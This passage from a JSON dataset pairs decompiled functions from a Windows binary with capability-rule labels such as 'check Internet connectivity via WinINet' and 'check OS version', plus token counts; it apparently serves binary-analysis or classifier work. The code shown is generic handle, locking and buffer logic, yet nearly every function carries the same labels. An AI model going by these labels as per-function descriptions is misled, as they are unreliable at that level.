            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00075bc0(void)\n\n{\n    int32_t iVar1;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00037420(0x800da9d4);\n    if (iVar1 == 0) {\n        for (var_4h = 0; var_4h < 10; var_4h = var_4h + 1) {\n            if (*(var_4h * 8 + -0x7ff46f44) != 0) {\n                iVar1 = *(var_4h * 8 + -0x7ff46f44);\n                for (var_ch = 0; *(iVar1 + var_ch * 0xc) != 0; var_ch = var_ch + 1) {\n                    (**(*(iVar1 + 8 + var_ch * 0xc) + 8))();\n                }\n                if (*(var_4h * 8 + -0x7ff46f48) != 0) {\n                    *(var_4h * 8 + -0x7ff46f48) = 0;\n                    *(var_4h * 8 + -0x7ff46f44) = 0;\n                }\n            }\n        }\n        fcn.00073cd0();\n        fcn.00075ea0();\n        fcn.00077160();\n        fcn.00074a30();\n        fcn.0006d0f0();\n    }\n    return;\n}\n",
        "token_count": 338
    },
    "00075d10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint8_t * __cdecl fcn.00075d10(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    uint var_1ch;\n    int32_t var_18h;\n    uint8_t *var_10h;\n    uint8_t *var_ch;\n    uint8_t **var_8h;\n    int32_t var_4h;\n    \n    var_4h = 9;\n    do {\n        if (var_4h < 0) {\n            return NULL;\n        }\n        for (var_8h = *(var_4h * 8 + -0x7ff46f44); (var_8h != NULL && (*var_8h != NULL)); var_8h = var_8h + 3) {\n            var_ch = arg_8h;\n            var_10h = *var_8h;\n            do {\n                uVar1 = *var_10h;\n                bVar2 = uVar1 < *var_ch;\n                if (uVar1 != *var_ch) {\ncode_r0x00075da3:\n                    var_18h = (1 - bVar2) - (bVar2 != 0);\n                    goto code_r0x00075dab;\n                }\n                if (uVar1 == 0) break;\n                uVar1 = var_10h[1];\n                bVar2 = uVar1 < var_ch[1];\n                if (uVar1 != var_ch[1]) goto code_r0x00075da3;\n                var_10h = var_10h + 2;\n                var_ch = var_ch + 2;\n            } while (uVar1 != 0);\n            var_18h = 0;\ncode_r0x00075dab:\n            if ((var_18h == 0) && (var_8h[1] == arg_ch)) {\n                return var_8h[2];\n            }\n        }\n        var_4h = var_4h + -1;\n    } while( true );\n}\n",
        "token_count": 461
    },
    "00075de0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00075de0(uint *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    *arg_ch = 0;\n    for (var_ch = arg_8h; var_ch != NULL; var_ch = *var_ch) {\n        *arg_ch = *arg_ch + var_ch[2];\n    }\n    iVar1 = fcn.000356c0(*arg_ch);\n    if (iVar1 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        var_4h = 0;\n        for (var_ch = arg_8h; var_ch != NULL; var_ch = *var_ch) {\n            fcn.00078be8(iVar1 + var_4h, var_ch[1], var_ch[2]);\n            var_4h = var_4h + var_ch[2];\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 229
    },
    "00075eb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00075eb0(int32_t **arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    char cVar1;\n    char *arg_8h_00;\n    int32_t *arg_8h_01;\n    int32_t iVar2;\n    char *pcVar3;\n    uint uVar4;\n    uint var_2ch;\n    uint var_24h;\n    char *var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uchar *var_4h;\n    \n    *arg_8h = NULL;\n    var_8h = 0;\n    while( true ) {\n        if (*(arg_ch + var_8h * 4) == 0) {\n            return 0x21590005;\n        }\n        arg_8h_00 = fcn.00035820(*(arg_ch + var_8h * 4));\n        if (arg_8h_00 == NULL) {\n            return 0x21590004;\n        }\n        var_4h = fcn.00078a44(arg_8h_00, 0x2e);\n        if (var_4h != NULL) {\n            *var_4h = 0;\n            var_4h = var_4h + 1;\n        }\n        pcVar3 = arg_8h_00;\n        uVar4 = arg_20h;\n        var_18h = fcn.00075cb0(arg_8h_00);\n        if (var_18h == 0) {\n            fcn.000357f0(arg_8h_00);\n            var_1ch = 0x21590005;\n            if ((*0x800b90a8 != 0) &&\n               (var_1ch = (**(*0x800b90a8 + 0xc))\n                                    (arg_8h, *(arg_ch + var_8h * 4), arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, pcVar3\n                                     , uVar4),  var_1ch == 0)) {\n                var_18h = *0x800b90a8;\n            }\n            if (((var_1ch == 0x21590005) && (*0x800b90b0 != 0)) &&\n               (var_1ch = (**(*0x800b90b0 + 0xc))\n                                    (arg_8h, *(arg_ch + var_8h * 4), arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h), \n               var_1ch == 0)) {\n                var_18h = *0x800b90b0;\n            }\n            if ((var_18h == 0) && (var_1ch != 0x21590005)) {\n                return var_1ch;\n            }\n        }\n        else {\n            if (var_4h == NULL) {\n                var_20h = arg_8h_00;\n                do {\n                    cVar1 = *var_20h;\n                    var_20h = var_20h + 1;\n                } while (cVar1 != '\\0');\n                var_10h = var_20h - (arg_8h_00 + 1);\n            }\n            else {\n                var_10h = var_4h - arg_8h_00;\n            }\n            fcn.000357f0(arg_8h_00);\n            var_1ch = (**(var_18h + 0xc))(arg_8h, *(arg_ch + var_8h * 4) + var_10h, arg_10h, arg_14h, arg_18h, arg_1ch, \n                                          arg_20h);\n        }\n        if (var_18h != 0) break;\n        var_8h = var_8h + 1;\n    }\n    if (var_1ch != 0) {\n        return var_1ch;\n    }\n    if (*arg_8h != NULL) {\n        arg_8h_01 = fcn.000356c0(0x20);\n        if (arg_8h_01 == NULL) {\n            (**(var_18h + 0x10))(*arg_8h, 0);\n            (**(var_18h + 0x14))(*arg_8h, 0);\n            *arg_8h = NULL;\n            return 0x21590004;\n        }\n        *arg_8h_01 = var_18h;\n        arg_8h_01[5] = 0;\n        arg_8h_01[6] = 0;\n        fcn.00036ed0(arg_8h_01 + 1);\n        fcn.000349b0(arg_8h_01 + 7);\n        **arg_8h = arg_8h_01;\n        iVar2 = fcn.0006d170(*arg_8h, 2);\n        if (iVar2 != 0) {\n            return 0;\n        }\n        fcn.00036f40(arg_8h_01 + 1);\n        fcn.000349e0(arg_8h_01 + 7);\n        fcn.000357f0(arg_8h_01);\n        (**(var_18h + 0x10))(*arg_8h, 0);\n        (**(var_18h + 0x14))(*arg_8h, 0);\n        *arg_8h = NULL;\n        return 0x21590004;\n    }\n    (**(var_18h + 0x10))(*arg_8h, 0);\n    (**(var_18h + 0x14))(*arg_8h, 0);\n    return -1;\n}\n",
        "token_count": 1360
    },
    "000761d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000761d0(int32_t **arg_8h, uint arg_ch)\n\n{\n    int32_t **arg_8h_00;\n    int32_t *arg_8h_01;\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = *arg_8h;\n    fcn.00034a10(0x800cdc20);\n    iVar1 = fcn.0006d2c0(arg_8h_00, 2);\n    if (iVar1 == 0) {\n        fcn.00034a80(0x800cdc20);\n        *arg_8h = NULL;\n    }\n    else {\n        arg_8h_01 = *arg_8h_00;\n        if (arg_8h_01[5] == 0) {\n            arg_8h_01[5] = 1;\n            fcn.00034a80(0x800cdc20);\n            (**(**arg_8h_00 + 0x10))(arg_8h_00, arg_ch);\n            fcn.00037100(arg_8h_01 + 1);\n            fcn.00034a10(0x800cdc20);\n            *arg_8h = NULL;\n            fcn.0006d200(arg_8h_00, 2);\n            fcn.00034a80(0x800cdc20);\n            (**(**arg_8h_00 + 0x14))(arg_8h_00, arg_ch);\n            fcn.00037190(arg_8h_01 + 1);\n            fcn.00036f40(arg_8h_01 + 1);\n            fcn.000349e0(arg_8h_01 + 7);\n            fcn.000357f0(arg_8h_01);\n        }\n        else {\n            fcn.00034a80(0x800cdc20);\n            *arg_8h = NULL;\n        }\n    }\n    return;\n}\n",
        "token_count": 453
    },
    "000762e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.000762e0(int32_t **arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    int32_t *arg_8h_00;\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00076f80(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x1c) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x1c) != 0)) {\n            var_4h = (**(**arg_8h + 0x1c))(arg_8h, arg_ch, arg_10h);\n            if (var_4h == 0) {\n                arg_8h_00 = fcn.000356c0(0x20);\n                if (arg_8h_00 == NULL) {\n                    fcn.00037020(*arg_8h + 1);\n                    (**(**arg_8h + 0x14))(*arg_ch, 0);\n                    *arg_ch = 0;\n                    return 0x21590004;\n                }\n                *arg_8h_00 = **arg_8h;\n                arg_8h_00[5] = 0;\n                arg_8h_00[6] = 0;\n                fcn.00036ed0(arg_8h_00 + 1);\n                fcn.000349b0(arg_8h_00 + 7);\n                **arg_ch = arg_8h_00;\n                iVar1 = fcn.0006d170(*arg_ch, 2);\n                if (iVar1 == 0) {\n                    fcn.00036f40(arg_8h_00 + 1);\n                    fcn.000349e0(arg_8h_00 + 7);\n                    fcn.000357f0(arg_8h_00);\n                    (**(**arg_8h + 0x14))(*arg_ch, 0);\n                    *arg_ch = 0;\n                    var_4h = 0x21590004;\n                }\n            }\n            else if ((*arg_8h)[5] != 0) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 606
    },
    "00076480": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00076480(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h == NULL) {\n        var_4h = fcn.00076ff0(arg_ch, arg_10h, arg_14h, arg_18h);\n    }\n    else {\n        var_4h = fcn.00076f80(arg_8h);\n        if (var_4h == 0) {\n            if (((**arg_8h + 0x38) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x38) != 0)) {\n                var_4h = (**(**arg_8h + 0x38))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n                if (var_4h == 0) {\n                    var_4h = fcn.00076ff0(arg_ch, arg_10h, arg_14h, arg_18h);\n                }\n                fcn.00037020(*arg_8h + 1);\n            }\n            else {\n                fcn.00037020(*arg_8h + 1);\n                var_4h = 0x21590001;\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 349
    },
    "00076560": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00076560(int32_t **arg_8h, uint arg_ch)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00076f80(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x18) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x18) != 0)) {\n            var_4h = (**(**arg_8h + 0x18))(arg_8h, arg_ch);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 262
    },
    "00076620": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00076620(int32_t **arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00076f80(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x20) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x20) != 0)) {\n            var_4h = (**(**arg_8h + 0x20))(arg_8h, arg_ch, arg_10h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 273
    },
    "000766e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.000766e0(int32_t **arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00076f80(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x24) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x24) != 0)) {\n            var_4h = (**(**arg_8h + 0x24))(arg_8h, arg_ch, arg_10h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 274
    },
    "000767a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.000767a0(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00076f80(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x28) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x28) != 0)) {\n            var_4h = (**(**arg_8h + 0x28))(arg_8h, arg_ch, arg_10h, arg_14h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 285
    },
    "00076860": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.00076860(int32_t **arg_8h, int32_t *arg_ch, uint *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t *piVar1;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00076f80(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x2c) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x2c) != 0)) {\n            var_4h = (**(**arg_8h + 0x2c))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((var_4h == 0) && (*arg_ch != 0)) {\n                piVar1 = *arg_8h;\n                fcn.00034a10(piVar1 + 7);\n                piVar1[6] = piVar1[6] + 1;\n                fcn.00034a80(piVar1 + 7);\n            }\n            else {\n                if ((*arg_8h)[5] != 0) {\n                    var_4h = 0x21590006;\n                }\n                fcn.00037020(*arg_8h + 1);\n                *arg_ch = 0;\n                *arg_10h = 0;\n            }\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 408
    },
    "00076970": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl\nfcn.00076970(int32_t **arg_8h, uint arg_ch, uint arg_10h, int32_t *arg_14h, uint *arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t *piVar1;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00076f80(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x30) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x30) != 0)) {\n            var_4h = (**(**arg_8h + 0x30))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n            if ((var_4h == 0) && (*arg_14h != 0)) {\n                piVar1 = *arg_8h;\n                fcn.00034a10(piVar1 + 7);\n                piVar1[6] = piVar1[6] + 1;\n                fcn.00034a80(piVar1 + 7);\n            }\n            else {\n                if ((*arg_8h)[5] != 0) {\n                    var_4h = 0x21590006;\n                }\n                fcn.00037020(*arg_8h + 1);\n                *arg_14h = 0;\n                *arg_18h = 0;\n            }\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 431
    },
    "00076a80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00076a80(int32_t **arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar2 = fcn.0006d2c0(arg_8h, 2);\n    if ((iVar2 != 0) && (arg_ch != 0)) {\n        piVar1 = *arg_8h;\n        fcn.00034a10(piVar1 + 7);\n        if (piVar1[6] < 1) {\n            fcn.00034a80(piVar1 + 7);\n        }\n        else {\n            piVar1[6] = piVar1[6] + -1;\n            fcn.00034a80(piVar1 + 7);\n            (**(**arg_8h + 0x34))(arg_8h, arg_ch);\n            fcn.00037020(*arg_8h + 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 228
    },
    "00076b10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00076b10(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00076f80(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x3c) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x3c) != 0)) {\n            var_4h = (**(**arg_8h + 0x3c))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 299
    },
    "00076be0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00076be0(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00076f80(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x40) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x40) != 0)) {\n            var_4h = (**(**arg_8h + 0x40))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 296
    },
    "00076cb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00076cb0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_ch_00;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = fcn.00076d20(arg_8h, arg_ch, arg_10h);\n    if (var_ch == 0x21590001) {\n        arg_ch_00 = fcn.00075de0(arg_ch, &var_4h);\n        if (arg_ch_00 == 0) {\n            var_ch = 0x21590004;\n        }\n        else {\n            var_ch = fcn.000767a0(arg_8h, arg_ch_00, var_4h, arg_10h);\n            fcn.000357f0(arg_ch_00);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 203
    },
    "00076d20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00076d20(int32_t **arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00076f80(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x44) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x44) != 0)) {\n            var_4h = (**(**arg_8h + 0x44))(arg_8h, arg_ch, arg_10h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00037020(*arg_8h + 1);\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 274
    },
    "00076de0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00076de0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t arg_ch_00;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = fcn.00076e70(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n    if (var_ch == 0x21590001) {\n        arg_ch_00 = fcn.00075de0(arg_ch, &var_4h);\n        if (arg_ch_00 == 0) {\n            var_ch = 0x21590004;\n        }\n        else {\n            var_ch = fcn.00076970(arg_8h, arg_ch_00, var_4h, arg_10h, arg_14h, arg_18h, arg_1ch);\n            fcn.000357f0(arg_ch_00);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 250
    },
    "00076e70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.00076e70(int32_t **arg_8h, uint arg_ch, int32_t *arg_10h, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t *piVar1;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00076f80(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x48) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x48) != 0)) {\n            var_4h = (**(**arg_8h + 0x48))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n            if ((var_4h == 0) && (*arg_10h != 0)) {\n                piVar1 = *arg_8h;\n                fcn.00034a10(piVar1 + 7);\n                piVar1[6] = piVar1[6] + 1;\n                fcn.00034a80(piVar1 + 7);\n            }\n            else {\n                if ((*arg_8h)[5] != 0) {\n                    var_4h = 0x21590006;\n                }\n                fcn.00037020(*arg_8h + 1);\n                *arg_10h = 0;\n                *arg_14h = 0;\n            }\n        }\n        else {\n            fcn.00037020(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 421
    },
    "00076f80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00076f80(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    fcn.00034a10(0x800cdc20);\n    iVar1 = fcn.0006d2c0(arg_8h, 2);\n    if (iVar1 == 0) {\n        var_4h = 0x21590065;\n    }\n    else if (*(*arg_8h + 0x14) == 0) {\n        fcn.00036f70(*arg_8h + 4);\n        var_4h = 0;\n    }\n    else {\n        var_4h = 0x21590006;\n    }\n    fcn.00034a80(0x800cdc20);\n    return var_4h;\n}\n",
        "token_count": 186
    },
    "00076ff0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
